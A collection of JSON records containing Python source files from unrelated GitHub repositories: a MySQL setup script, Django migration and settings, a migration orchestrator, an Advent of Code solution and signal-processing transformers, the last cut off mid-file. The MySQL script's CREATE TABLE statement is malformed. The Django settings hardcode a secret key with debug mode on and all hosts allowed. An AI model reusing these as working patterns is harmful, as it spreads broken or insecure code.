{"blob_id": "957f2c59a82039e7ca05cb449191376e312de5d4", "directory_id": "56b47728ffe36878096fac0d8fb0deb94a8a9b7c", "path": "/SQLdb.py", "content_id": "7140ce7027f76ebad847674b3e3bf46a455fe87a", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "CaMeLCa5e/dailyspring2015", "snapshot_id": "1a930fc74930bb7d286956f17fcf36ec48802b4e", "revision_id": "1b2039b9908407a31e951e44f66bafebf3d7422b", "branch_name": "refs/heads/master", "visit_date": "2016-09-05 19:54:44.918992", "revision_date": "2015-05-24 23:51:39", "committer_date": "2015-05-24 23:51:39", "github_id": "33795537", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "463", "extension": "py", "content": "#! usr/bin/python \nimport MySQLdb\n\ndb = MySQLdb.connect(\"localhost\", \"testuser\", \"test123\", \"TESTDB\")\n\ncursor = db.cursor()\n\ncursor.execute(\"DROP TABLE IF EXISTS EMPLOYEE\")\n\n# cursor.execute(\"SELECT VERSION()\")\n\n# data = cursor.fetchone()\n\n# print \"Database version : %s\" %data\n\n# db.close \n\nsql = \"\"\"CREATE TABLE EMPLOYEE (\n\t\t\tFIRST_NAME CHAR(20) NOT NULL,\n\t\t\tLAST_NALE CHAR(20),\n\t\t\tAGE INT,\n\t\t\tSEX CHAR(1)\n\t\t\tINCOME FLOAT )\"\"\"\n\ncursor.execute(sql)\n\ndb.close()\n\n"}
{"blob_id": "93d7a55b3b52ecfbe04f4a71439b7783d0f9fb4c", "directory_id": "f5b17969f161d918c2903e2f2f64e9aa9c564bd4", "path": "/main/migrations/0001_initial.py", "content_id": "f16cd1bad7e3b9c96f013b0fc1eab04db81f09e0", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "dakrulski/django-pizza-example", "snapshot_id": "861a6baed98ce3eb2e31c9c09e7285ad6f7e0d92", "revision_id": "a8660b49f17556cc26abd86595d75f0981a6cfcf", "branch_name": "refs/heads/master", "visit_date": "2022-12-12 19:06:44.260403", "revision_date": "2019-01-17 09:31:37", "committer_date": "2019-01-17 09:31:37", "github_id": "117907077", "star_events_count": "7", "fork_events_count": "13", "gha_license_id": "None", "gha_event_created_at": "2021-06-10 20:00:47", "gha_created_at": "2018-01-17 23:54:12", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1865", "extension": "py", "content": "# Generated by Django 2.0.1 on 2018-01-13 17:57\n\nfrom django.db import migrations, models\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Pizza',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('name', models.CharField(max_length=60)),\n                ('price_small', models.DecimalField(decimal_places=2, max_digits=8)),\n                ('price_big', models.DecimalField(decimal_places=2, max_digits=8)),\n                ('description', models.TextField(null=True)),\n            ],\n        ),\n        migrations.CreateModel(\n            name='PizzaTopping',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('pizza', models.ForeignKey(on_delete=django.db.models.deletion.PROTECT, to='main.Pizza')),\n            ],\n        ),\n        migrations.CreateModel(\n            name='Topping',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('name', models.CharField(max_length=60)),\n                ('on_top_of', models.ManyToManyField(through='main.PizzaTopping', to='main.Pizza')),\n            ],\n        ),\n        migrations.AddField(\n            model_name='pizzatopping',\n            name='topping',\n            field=models.ForeignKey(on_delete=django.db.models.deletion.PROTECT, to='main.Topping'),\n        ),\n        migrations.AddField(\n            model_name='pizza',\n            name='toppings',\n            field=models.ManyToManyField(through='main.PizzaTopping', to='main.Topping'),\n        ),\n    ]\n"}
{"blob_id": "26fabfda61115811b13d95b272a0c78d93ef5adb", "directory_id": "2ca91d379b291a4e7f5e804a63bb43f8bf316adf", "path": "/transmutator/orchestration.py", "content_id": "4ce766f5a01531d50647193e7696e42afa9455f4", "detected_licenses": "['BSD-3-Clause']", "license_type": "permissive", "repo_name": "benoitbryon/transmutator", "snapshot_id": "918146ebfdd67ca67ac7f97715f8d59d745c32da", "revision_id": "865a275a601cd735a131a58576aa12c68510b644", "branch_name": "refs/heads/master", "visit_date": "2021-01-17 13:21:39.027197", "revision_date": "2015-06-24 10:30:58", "committer_date": "2015-06-24 10:30:58", "github_id": "12803979", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "2016-06-27 21:40:38", "gha_created_at": "2013-09-13 07:30:30", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "7563", "extension": "py", "content": "import os\nimport shutil\n\nfrom xal.session.local import LocalSession\n\n\nclass Orchestrator(object):\n    def __init__(self):\n        root_dir = os.path.abspath(os.getcwd())\n        self.mutations_dir = os.path.join(root_dir, 'mutations')\n        self.working_dir = os.path.join(root_dir, 'var', 'transmutator')\n        if not os.path.isdir(self.working_dir):\n            os.makedirs(self.working_dir)\n        self.todo_dir = os.path.join(self.working_dir, 'todo')\n        if not os.path.isdir(self.todo_dir):\n            os.makedirs(self.todo_dir)\n        self.doing_dir = os.path.join(self.working_dir, 'doing')\n        if not os.path.isdir(self.doing_dir):\n            os.makedirs(self.doing_dir)\n        self.done_dir = os.path.join(self.working_dir, 'done')\n        if not os.path.isdir(self.done_dir):\n            os.makedirs(self.done_dir)\n\n    def mutation_sourcefile(self, mutation):\n        \"\"\"Return absolute filename to mutation.\"\"\"\n        return os.path.join(self.mutations_dir, mutation)\n\n    def is_mutation(self, mutation):\n        \"\"\"Return ``True`` if ``mutation`` is path to an executable file.\"\"\"\n        return os.access(self.mutation_sourcefile(mutation), os.X_OK)\n\n    def is_done(self, mutation):\n        \"\"\"Return ``True`` if ``mutation`` has already been performed.\"\"\"\n        return os.path.isfile(os.path.join(self.done_dir, mutation))\n\n    def is_new(self, mutation):\n        \"\"\"Return ``True`` if ``mutation`` has not been performed yet.\"\"\"\n        return not os.path.exists(os.path.join(self.done_dir, mutation))\n\n    def is_recurrent(self, mutation):\n        \"\"\"Return ``True`` if ``mutation`` has to be performed on every run.\n\n        On forward, recurrent mutations are not skipped, they go forward.\n\n        \"\"\"\n        return mutation.startswith('recurrent/')\n\n    def is_in_development(self, mutation):\n        \"\"\"Return ``True`` if ``mutation`` is in development.\n\n        On forward, in-development mutations go backward and forward.\n\n        \"\"\"\n        return mutation.startswith('development')\n\n    def collect_mutations(self):\n        \"\"\"Iterates over all available mutations, whatever their status.\n\n        The return iterator is not sorted.\n\n        \"\"\"\n        for (dirpath, dirnames, filenames) in os.walk(self.mutations_dir):\n            for filename in filenames:\n                relative_dirname = dirpath[len(self.mutations_dir):]\n                relative_dirname = relative_dirname.lstrip(os.path.sep)\n                relative_filename = os.path.join(relative_dirname, filename)\n                yield relative_filename\n\n    def register_mutation(self, mutation):\n        \"\"\"Register mutation as TODO or DONE.\"\"\"\n        todo = self.is_new(mutation) or \\\n            self.is_in_development(mutation) or \\\n            self.is_recurrent(mutation)\n        if todo:\n            dest = os.path.join(self.todo_dir, mutation)\n            if not os.path.isdir(os.path.dirname(dest)):\n                os.makedirs(os.path.dirname(dest))\n            shutil.copy2(os.path.join(self.mutations_dir, mutation), dest)\n\n    def start_mutation(self, mutation):\n        \"\"\"Mark mutation from TODO to DOING.:\"\"\"\n        todo = os.path.join(self.todo_dir, mutation)\n        todo_dir = os.path.dirname(todo)\n        doing = os.path.join(self.doing_dir, mutation)\n        if not os.path.isdir(os.path.dirname(doing)):\n            os.makedirs(os.path.dirname(doing))\n        if self.is_recurrent(mutation):\n            shutil.copy2(todo, doing)\n        else:\n            shutil.move(todo, doing)\n        if todo_dir != self.todo_dir and not os.listdir(todo_dir):\n            shutil.rmtree(todo_dir)\n\n    def todo_releases(self):\n        \"\"\"Return ordered list of releases to process.\"\"\"\n        releases = []\n        noname_release = False\n        development_release = False\n        for name in os.listdir(self.todo_dir):\n            if os.path.isdir(os.path.join(self.todo_dir, name)):\n                if name == 'development':\n                    development_release = True\n                elif name == 'recurrent':\n                    pass\n                else:\n                    releases.append(name)\n            else:\n                noname_release = True\n        releases.sort()\n        if noname_release:\n            releases.insert(0, '')\n        if development_release:\n            releases.append('development')\n        return releases\n\n    def todo_recurrent(self):\n        \"\"\"Return ordered list of recurrent mutations.\"\"\"\n        files = os.listdir(os.path.join(self.todo_dir, 'recurrent'))\n        files.sort()\n        return [os.path.join('recurrent', name) for name in files]\n\n    def todo_mutations(self, release):\n        files = []\n        recurrent_mutations = self.todo_recurrent()\n        absolute_release = os.path.join(self.todo_dir, release)\n        for filename in os.listdir(absolute_release):\n            if os.path.isfile(os.path.join(absolute_release, filename)):\n                relative_filename = os.path.join(release, filename)\n                files.append((filename, relative_filename))\n        for recurrent in recurrent_mutations:\n            files.append((recurrent[len('recurrent/'):], recurrent))\n        files.sort()\n        files = [mutation for f, mutation in files]\n        return files\n\n    def forward_mutation(self, mutation):\n        print('## FORWARD mutation \"{name}\"'.format(name=mutation))\n        session = LocalSession()\n        sh = session.sh\n        result = sh.run(os.path.join(self.doing_dir, mutation))\n        print(result.stdout)\n\n    def backward_mutation(self, mutation):\n        print('## BACKWARD mutation \"{name}\"'.format(name=mutation))\n        session = LocalSession()\n        sh = session.sh\n        result = sh.run([\n            os.path.join(self.doing_dir, mutation),\n            '--backward'])\n        print(result.stdout)\n\n    def run_mutation(self, mutation):\n        do_backward = (self.is_done(mutation)\n                       and self.is_in_development(mutation))\n        do_forward = True\n        if do_backward:\n            self.backward_mutation(mutation)\n        if do_forward:\n            self.forward_mutation(mutation)\n\n    def success_mutation(self, mutation):\n        \"\"\"Mark mutation as DONE.:\"\"\"\n        doing = os.path.join(self.doing_dir, mutation)\n        doing_dir = os.path.dirname(doing)\n        done = os.path.join(self.done_dir, mutation)\n        if not os.path.isdir(os.path.dirname(done)):\n            os.makedirs(os.path.dirname(done))\n        if not self.is_recurrent(mutation):\n            shutil.move(doing, done)\n            if doing_dir != self.doing_dir and not os.listdir(doing_dir):\n                shutil.rmtree(doing_dir)\n\n    def error_mutation(self, mutation):\n        \"\"\"Register error and warn user.\"\"\"\n        print('ERROR with mutation \"{name}\"'.format(name=mutation))\n\n    def run_mutations(self):\n        for mutation in self.collect_mutations():\n            self.register_mutation(mutation)\n        for release in self.todo_releases():\n            print('#### Processing release \"{name}\" ####'.format(name=release))\n            for mutation in self.todo_mutations(release):\n                self.start_mutation(mutation)\n                try:\n                    self.run_mutation(mutation)\n                except:\n                    self.error_mutation(mutation)\n                else:\n                    self.success_mutation(mutation)\n        recurrent_dir = os.path.join(self.todo_dir, 'recurrent')\n        if os.path.exists(recurrent_dir) and os.listdir(recurrent_dir):\n            shutil.rmtree(recurrent_dir)\n"}
{"blob_id": "627d1e6a2cdc3cf718162c2da7f7045a0cc2c408", "directory_id": "7978cf6a612816b97beeb34e4ccc4a3f68c44767", "path": "/1/1_2.py", "content_id": "2b44561d8277813145276f3ac86f8525dc54c6aa", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "nemesmarci/Advent-of-Code-2018", "snapshot_id": "13e9acd01b019ef0e890f0472c0c316a17dd60be", "revision_id": "47dfac4afa69636428b722eb96fba2596bf8368c", "branch_name": "refs/heads/master", "visit_date": "2022-01-01 09:47:46.652193", "revision_date": "2019-12-10 23:28:36", "committer_date": "2021-12-29 19:48:02", "github_id": "159982537", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "315", "extension": "py", "content": "with open('input.txt') as data:\n    lines = data.readlines()\n\nfrequency = 0\nfrequencies = set()\n\nfound = False\nwhile not found:\n    for line in lines:\n        frequencies.add(frequency)\n        frequency += int(line)\n        if frequency in frequencies:\n            found = True\n            break\n\nprint(frequency)\n"}
{"blob_id": "174f606dc52d525ca17c966b9e8501564ad51f74", "directory_id": "2d913944cce7a8ad43bf9bb3b9d874190c8f0737", "path": "/modeltranslation/models.py", "content_id": "86cfacd17b1c13e704db25bb4c3d4a982d8a87b8", "detected_licenses": "['BSD-3-Clause']", "license_type": "permissive", "repo_name": "pigletto/django-modeltranslation", "snapshot_id": "c3f8d1e6599ccffc978f7c782dfbd5eff6fe9d76", "revision_id": "8a30ecdc2da58af12af6528a6ac794cf9a8fbbdb", "branch_name": "refs/heads/master", "visit_date": "2021-04-18 18:35:52.645369", "revision_date": "2013-01-18 20:41:18", "committer_date": "2013-01-18 20:41:18", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3032", "extension": "py", "content": "# -*- coding: utf-8 -*-\n\n\ndef autodiscover():\n    \"\"\"\n    Auto-discover INSTALLED_APPS translation.py modules and fail silently when\n    not present. This forces an import on them to register.\n    Also import explicit modules.\n    \"\"\"\n    import os\n    import sys\n    import copy\n    from django.conf import settings\n    from django.utils.importlib import import_module\n    from django.utils.module_loading import module_has_submodule\n    from modeltranslation.translator import translator\n    from modeltranslation.settings import TRANSLATION_FILES, DEBUG\n\n    for app in settings.INSTALLED_APPS:\n        mod = import_module(app)\n        # Attempt to import the app's translation module.\n        module = '%s.translation' % app\n        before_import_registry = copy.copy(translator._registry)\n        try:\n            import_module(module)\n        except:\n            # Reset the model registry to the state before the last import as\n            # this import will have to reoccur on the next request and this\n            # could raise NotRegistered and AlreadyRegistered exceptions\n            translator._registry = before_import_registry\n\n            # Decide whether to bubble up this error. If the app just\n            # doesn't have an translation module, we can ignore the error\n            # attempting to import it, otherwise we want it to bubble up.\n            if module_has_submodule(mod, 'translation'):\n                raise\n\n    for module in TRANSLATION_FILES:\n        import_module(module)\n\n    # In debug mode, print a list of registered models and pid to stdout.\n    # Note: Differing model order is fine, _registry is just a dict and we\n    # don't rely on a particular order.\n    if DEBUG:\n        try:\n            if sys.argv[1] in ('runserver', 'runserver_plus'):\n                translated_model_names = ', '.join(\n                    t.__name__ for t in translator._registry.keys())\n                print('modeltranslation: Registered %d models for translation '\n                      '(%s) [pid:%d].' % (\n                          len(translator._registry), translated_model_names,\n                          os.getpid()))\n        except IndexError:\n            pass\n\n\ndef handle_translation_registrations(*args, **kwargs):\n    \"\"\"\n    Ensures that any configuration of the TranslationOption(s) are handled when\n    importing modeltranslation.\n\n    This makes it possible for scripts/management commands that affect models\n    but know nothing of modeltranslation.\n    \"\"\"\n    from modeltranslation.settings import ENABLE_REGISTRATIONS\n\n    if not ENABLE_REGISTRATIONS:\n        # If the user really wants to disable this, they can, possibly at their\n        # own expense. This is generally only required in cases where other\n        # apps generate import errors and requires extra work on the user's\n        # part to make things work.\n        return\n\n    # Trigger autodiscover, causing any TranslationOption initialization\n    # code to execute.\n    autodiscover()\n\n\nhandle_translation_registrations()\n"}
{"blob_id": "8fa5990751f50d2df9d11ce774dd13b1c1d9b9f1", "directory_id": "01826287c8ce450431b71837576aac41b8e07e5d", "path": "/webservices/settings.py", "content_id": "df7a5559888aea131e13879b5b0f3e8c09a813c0", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "abhinavbhardwaj07/webservices", "snapshot_id": "97364b55a08d707cf45bdfd474d2bd0958f0a7bc", "revision_id": "5e0e7424799b093d6c5840d4d21c2104088e709d", "branch_name": "refs/heads/master", "visit_date": "2020-03-15 17:32:49.843735", "revision_date": "2018-05-06 05:52:29", "committer_date": "2018-05-06 05:52:29", "github_id": "132264065", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "4897", "extension": "py", "content": "\"\"\"\nDjango settings for webservices project.\n\nGenerated by 'django-admin startproject' using Django 1.11.10.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/1.11/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/1.11/ref/settings/\n\"\"\"\n\nimport os\nimport mongoengine\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\nBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/1.11/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'xa&4)xwz9o5o)o9o-dl#l*^v-8$ha6*35xl+-$p$ei4v#rvnf%'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = ['*']\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n\n    'url_lookup_service.apps.UrlLookupServiceConfig',\n    'rest_framework',\n    'rest_framework_mongoengine',\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'webservices.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'webservices.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/1.11/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),\n    }\n}\n\n\nmongoengine.connect(db='<dbname>',\n                    host='<host_ip>',\n                    port=27017,\n                    username='<user>',\n                    password='<password>')\n\n\n# Password validation\n# https://docs.djangoproject.com/en/1.11/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n# Internationalization\n# https://docs.djangoproject.com/en/1.11/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/1.11/howto/static-files/\n\nSTATIC_URL = '/static/'\n\n# ==============================================================================\n# LOGGING\n# ==============================================================================\nLOGGING = {\n    'version': 1,\n    'disable_existing_loggers': False,\n    'formatters': {\n        'verbose': {\n            'format': '%(levelname)s %(asctime)s %(module)s %(process)d %(thread)d %(message)s'\n        },\n        'simple': {\n            'format': '%(levelname)s %(message)s'\n        },\n    },\n    'filters': {\n        'require_debug_true': {\n            '()': 'django.utils.log.RequireDebugTrue',\n        },\n    },\n    'handlers': {\n        'console': {\n            'level': 'INFO',\n            'filters': ['require_debug_true'],\n            'class': 'logging.StreamHandler',\n            'formatter': 'simple'\n        },\n        'logfile': {\n            'level':'DEBUG',\n            'class':'logging.handlers.RotatingFileHandler',\n            'filename': \"logs/url_lookup.log\",\n            'maxBytes': 50000,\n            'backupCount': 2,\n            'formatter': 'simple',\n        },\n    },\n    'loggers': {\n        'django': {\n            'handlers': ['console', 'logfile'],\n            'propagate': True,\n        },\n        'root': {\n            'level': 'DEBUG',\n            'handlers': ['console', 'logfile']\n        },\n        'url_lookup_service.apps.UrlLookupServiceConfig': {\n            'handlers': ['console', 'logfile'],\n            'level': 'INFO'\n        }\n    }\n}\n"}
{"blob_id": "9184a4c3c5390c9ebd176a3e51ed10bfa3eb3dc6", "directory_id": "4a4b05119f116be2f674cf39e66944ae44f76f55", "path": "/rolldecayestimators/transformers.py", "content_id": "b57725c895942d687565d709a9d0677942ac8a94", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "martinlarsalbert/rolldecay-estimators", "snapshot_id": "a84ea4fc8dca2b8b7e6573c9b6e8d162809c6302", "revision_id": "c74642ce2b5299d4aa849c277fbaf8688f79f760", "branch_name": "refs/heads/master", "visit_date": "2022-11-20 20:39:13.488465", "revision_date": "2022-11-07 13:04:40", "committer_date": "2022-11-07 13:04:40", "github_id": "237425836", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "16142", "extension": "py", "content": "import numpy as np\nimport matplotlib.pyplot as plt\nfrom sklearn.base import BaseEstimator, TransformerMixin\nfrom sklearn.utils.validation import check_is_fitted\nfrom sklearn.linear_model import LinearRegression\nimport pandas as pd\n\nimport rolldecayestimators.filters\nimport rolldecayestimators.measure as measure\nfrom sklearn.metrics import r2_score\n\nclass CutTransformer(BaseEstimator, TransformerMixin):\n    \"\"\" Rolldecay transformer that cut time series from roll decay test for estimator.\n\n    Parameters\n    ----------\n    phi_max : float, default=np.deg2rad(90)\n        Start cutting value is below this value [rad]\n\n    phi_min : float, default=0\n        Stop cutting value is when below this value [rad]\n\n    Attributes\n    ----------\n    n_features_ : int\n        The number of features of the data passed to :meth:`fit`.\n    \"\"\"\n    def __init__(self, phi_max=np.deg2rad(90), phi_min=0, phi1d_start_tolerance=0.005):\n        self.phi_max = phi_max  # Maximum Roll angle [rad]\n        self.phi_min = phi_min  # Minimum Roll angle [rad]\n        self.phi_key = 'phi'  # Roll angle [rad]\n        self.remove_end_samples = 200  # Remove this many samples from end (funky stuff may happen during end of tests)\n        self.phi1d_start_tolerance = phi1d_start_tolerance\n\n    def fit(self, X, y=None):\n        \"\"\"Do the cut\n\n        Parameters\n        ----------\n        X : {array-like, sparse matrix}, shape (n_samples, n_features)\n            The training input samples.\n        y : None\n            There is no need of a target in a transformer, yet the pipeline API\n            requires this parameter.\n\n        Returns\n        -------\n        self : object\n            Returns self.\n        \"\"\"\n        #X = check_array(X, accept_sparse=True)\n\n        self.n_features_ = X.shape[1]\n\n        phi = X[self.phi_key]\n        if (self.phi_max < phi.abs().min()):\n            raise ValueError('\"phi_max\" is too small')\n\n        if (self.phi_min > phi.abs().max()):\n            raise ValueError('\"phi_min\" is too large')\n\n        if not isinstance(self.remove_end_samples,int):\n            raise ValueError('\"remove_end_samples\" should be integer')\n\n        if self.remove_end_samples<1:\n            raise ValueError('\"remove_end_samples\" > 1')\n\n        # Return the transformer\n        return self\n\n    def transform(self, X):\n        \"\"\" A reference implementation of a transform function.\n\n        Parameters\n        ----------\n        X : {array-like, sparse-matrix}, shape (n_samples, n_features)\n            The input samples.\n\n        Returns\n        -------\n        X_transformed : array, shape (n_samples, n_features)\n            The array containing the element-wise square roots of the values\n            in ``X``.\n        \"\"\"\n        # Check is fit had been called\n        check_is_fitted(self, 'n_features_')\n\n        # Input validation\n        #X = check_array(X, accept_sparse=True)\n\n        # Check that the input is of the same shape as the one passed\n        # during fit.\n        #if X.shape[1] != self.n_features_:\n        #    raise ValueError('Shape of input is different from what was seen'\n        #                     'in `fit`')\n\n        #Remove initial part (by removing first to maximums):\n        phi = X[self.phi_key]\n        index = phi.abs().idxmax()\n        X_cut = X.loc[index:].copy()\n\n        if (len(X_cut) > 10*self.remove_end_samples):\n            X_cut = X_cut.iloc[0:-self.remove_end_samples]\n\n        phi = X_cut[self.phi_key]\n        phi_max_sign = np.sign(phi.loc[index])\n        if phi_max_sign == 1:\n            index2 = phi.idxmin()\n        else:\n            index2 = phi.idxmax()\n\n        X_cut = X_cut.loc[index2:].copy()\n\n        X_interpolated = measure.sample_increase(X=X_cut, increase=5)\n        X_zerocrossings = measure.get_peaks(X=X_interpolated)\n        mask = X_interpolated.index >= X_zerocrossings.index[0]\n        X_interpolated = X_interpolated.loc[mask]\n\n        # Remove some large angles at start\n        mask = X_zerocrossings['phi'].abs() < self.phi_max\n        X_zerocrossings2 = X_zerocrossings.loc[mask].copy()\n        if len(X_zerocrossings2) > 0:\n            mask2 = X_interpolated.index > X_zerocrossings2.index[0]\n            X_interpolated = X_interpolated.loc[mask2]\n\n\n        # Remove some small angles at end\n        mask = X_zerocrossings2['phi'].abs() < self.phi_min\n        X_zerocrossings3 = X_zerocrossings2.loc[mask].copy()\n        if len(X_zerocrossings3) > 0:\n            mask3 = X_interpolated.index < X_zerocrossings3.index[0]\n            X_interpolated = X_interpolated.loc[mask3]\n\n        if 'phi1d' in X_cut:\n            phi1d_start = np.abs(X_interpolated.iloc[0]['phi1d'])\n        \n            if phi1d_start > self.phi1d_start_tolerance:\n                raise ValueError('Start phi1d exceeds phi1d_start_tolerance (%f > %f)' % (phi1d_start, self.phi1d_start_tolerance) )\n\n        mask = ((X_cut.index >= X_interpolated.index[0]) & (X_cut.index <= X_interpolated.index[-1]))\n        X_cut=X_cut.loc[mask].copy()\n\n        return X_cut\n\nclass LowpassFilterDerivatorTransformer(BaseEstimator, TransformerMixin):\n    \"\"\" Rolldecay transformer that lowpass filters the roll signal for estimator.\n\n    Parameters\n    ----------\n    phi_max : float, default=np.deg2rad(90)\n        Start cutting value is below this value [rad]\n\n    phi_min : float, default=0\n        Stop cutting value is when below this value [rad]\n\n    Attributes\n    ----------\n    n_features_ : int\n        The number of features of the data passed to :meth:`fit`.\n    \"\"\"\n    def __init__(self, cutoff=0.5, order=5, minimum_score=0.999):\n        self.cutoff = cutoff\n        self.order = order\n        self.phi_key = 'phi'  # Roll angle [rad]\n        self.phi_filtered_key = 'phi_filtered'  # Filtered roll angle [rad]\n        self.phi1d_key = 'phi1d'  # Roll velocity [rad/s]\n        self.phi2d_key = 'phi2d'  # Roll acceleration [rad/s2]\n        self.minimum_score = minimum_score\n\n    def fit(self, X, y=None):\n        \"\"\"Do the cut\n\n        Parameters\n        ----------\n        X : {array-like, sparse matrix}, shape (n_samples, n_features)\n            The training input samples.\n        y : None\n            There is no need of a target in a transformer, yet the pipeline API\n            requires this parameter.\n\n        Returns\n        -------\n        self : object\n            Returns self.\n        \"\"\"\n        #X = check_array(X, accept_sparse=True)\n\n        self.n_features_ = X.shape[1]\n\n        assert self.score(X=X) > self.minimum_score\n\n        # Return the transformer\n        return self\n\n    def transform(self, X):\n        \"\"\" A reference implementation of a transform function.\n\n        Parameters\n        ----------\n        X : {array-like, sparse-matrix}, shape (n_samples, n_features)\n            The input samples.\n\n        Returns\n        -------\n        X_transformed : array, shape (n_samples, n_features)\n            The array containing the element-wise square roots of the values\n            in ``X``.\n        \"\"\"\n        # Check is fit had been called\n        check_is_fitted(self, 'n_features_')\n\n        # Input validation\n        #X = check_array(X, accept_sparse=True)\n\n        # Check that the input is of the same shape as the one passed\n        # during fit.\n        #if X.shape[1] != self.n_features_:\n        #    raise ValueError('Shape of input is different from what was seen'\n        #                     'in `fit`')\n\n        # Lowpass filter the signal:\n        self.X = X.copy()\n        self.X_filter = X.copy()\n        ts = np.mean(np.diff(self.X_filter.index))\n        fs = 1 / ts\n        self.X_filter[self.phi_filtered_key] = rolldecayestimators.filters.lowpass_filter(data=self.X_filter['phi'],\n                                                                                     cutoff=self.cutoff, fs=fs,\n                                                                                     order=self.order)\n\n        self.X_filter = self.add_derivatives(X=self.X_filter)\n\n        return self.X_filter\n\n    def plot_filtering(self):\n\n        fig, axes = plt.subplots(nrows=3)\n\n        ax = axes[0]\n        self.X.plot(y='phi', ax=ax)\n        self.X_filter.plot(y='phi_filtered', ax=ax, style='--')\n        ax.legend();\n\n        ax = axes[1]\n        self.X_filter.plot(y='phi1d', ax=ax, style='--')\n        ax.legend();\n\n        ax = axes[2]\n        self.X_filter.plot(y='phi2d', ax=ax, style='--')\n        ax.legend();\n\n    def add_derivatives(self, X):\n        # Add accelerations:\n        assert self.phi_key in X\n        X = X.copy()\n        X[self.phi1d_key] = np.gradient(X[self.phi_filtered_key].values, X.index.values)\n        X[self.phi2d_key] = np.gradient(X[self.phi1d_key].values, X.index.values)\n        return X\n\n    def score(self, X, y=None, sample_weight=None):\n        \"\"\"\n        Return the coefficient of determination R_b^2 of the prediction.\n\n        The coefficient R_b^2 is defined as (1 - u/v), where u is the residual sum of squares\n        ((y_true - y_pred) ** 2).sum() and v is the total sum of squares ((y_true - y_true.mean()) ** 2).sum().\n        The best possible score is 1.0 and it can be negative (because the model can be arbitrarily worse).\n        A constant model that always predicts the expected value of y, disregarding the input features,\n        would get a R_b^2 score of 0.0.\n\n        Parameters\n        ----------\n        X : array-like of shape (n_samples, n_features)\n            Test samples. For some estimators this may be a precomputed kernel matrix or a list of generic\n            objects instead, shape = (n_samples, n_samples_fitted), where n_samples_fitted is the number of samples\n            used in the fitting for the estimator.\n\n        y : Dummy not used\n\n        sample_weight : Dummy\n\n        